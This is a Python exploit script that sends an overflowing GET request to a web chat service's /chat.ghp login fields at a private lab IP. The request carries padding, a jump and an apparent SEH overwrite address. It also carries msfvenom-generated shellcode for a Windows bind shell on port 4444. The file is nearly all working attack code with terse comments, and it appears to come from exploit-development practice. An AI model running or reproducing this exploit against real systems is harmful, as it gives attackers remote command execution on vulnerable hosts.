import socket

#creating socket for connection

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.133.136", 80))

#buufer to send
buf = "A" * 216
buf += "\xEB\x06\x90\x90"
buf += "\x1E\x07\x01\x10" # 1001071E

#Payload creation: msfvenom -p windows/shell_bind_tcp lport=4444 -a x86 -b "\x00\x0a\x0d\x20" -f python
buf += "\xbe\x71\xb3\x81\xe7\xda\xd7\xd9\x74\x24\xf4\x58\x29"
buf += "\xc9\xb1\x53\x31\x70\x12\x83\xc0\x04\x03\x01\xbd\x63"
buf += "\x12\x1d\x29\xe1\xdd\xdd\xaa\x86\x54\x38\x9b\x86\x03"
buf += "\x49\x8c\x36\x47\x1f\x21\xbc\x05\x8b\xb2\xb0\x81\xbc"
buf += "\x73\x7e\xf4\xf3\x84\xd3\xc4\x92\x06\x2e\x19\x74\x36"
buf += "\xe1\x6c\x75\x7f\x1c\x9c\x27\x28\x6a\x33\xd7\x5d\x26"
buf += "\x88\x5c\x2d\xa6\x88\x81\xe6\xc9\xb9\x14\x7c\x90\x19"
buf += "\x97\x51\xa8\x13\x8f\xb6\x95\xea\x24\x0c\x61\xed\xec"
buf += "\x5c\x8a\x42\xd1\x50\x79\x9a\x16\x56\x62\xe9\x6e\xa4"
buf += "\x1f\xea\xb5\xd6\xfb\x7f\x2d\x70\x8f\xd8\x89\x80\x5c"
buf += "\xbe\x5a\x8e\x29\xb4\x04\x93\xac\x19\x3f\xaf\x25\x9c"
buf += "\xef\x39\x7d\xbb\x2b\x61\x25\xa2\x6a\xcf\x88\xdb\x6c"
buf += "\xb0\x75\x7e\xe7\x5d\x61\xf3\xaa\x09\x46\x3e\x54\xca"
buf += "\xc0\x49\x27\xf8\x4f\xe2\xaf\xb0\x18\x2c\x28\xb6\x32"
buf += "\x88\xa6\x49\xbd\xe9\xef\x8d\xe9\xb9\x87\x24\x92\x51"
buf += "\x57\xc8\x47\xcf\x5f\x6f\x38\xf2\xa2\xcf\xe8\xb2\x0c"
buf += "\xb8\xe2\x3c\x73\xd8\x0c\x97\x1c\x71\xf1\x18\x33\xde"
buf += "\x7c\xfe\x59\xce\x28\xa8\xf5\x2c\x0f\x61\x62\x4e\x65"
buf += "\xd9\x04\x07\x6f\xde\x2b\x98\xa5\x48\xbb\x13\xaa\x4c"
buf += "\xda\x23\xe7\xe4\x8b\xb4\x7d\x65\xfe\x25\x81\xac\x68"
buf += "\xc5\x10\x2b\x68\x80\x08\xe4\x3f\xc5\xff\xfd\xd5\xfb"
buf += "\xa6\x57\xcb\x01\x3e\x9f\x4f\xde\x83\x1e\x4e\x93\xb8"
buf += "\x04\x40\x6d\x40\x01\x34\x21\x17\xdf\xe2\x87\xc1\x91"
buf += "\x5c\x5e\xbd\x7b\x08\x27\x8d\xbb\x4e\x28\xd8\x4d\xae"
buf += "\x99\xb5\x0b\xd1\x16\x52\x9c\xaa\x4a\xc2\x63\x61\xcf"
buf += "\xf2\x29\x2b\x66\x9b\xf7\xbe\x3a\xc6\x07\x15\x78\xff"
buf += "\x8b\x9f\x01\x04\x93\xea\x04\x40\x13\x07\x75\xd9\xf6"
buf += "\x27\x2a\xda\xd2"

#authentication request
head = "GET /chat.ghp?username=" + buf + "&password=" + buf + "&room=1 HTTP/1.1\r\n"
head += "Host: 192.168.133.136\r\n"

#sending malicious request
s.send(head + "\r\n\r\n")
s.close()
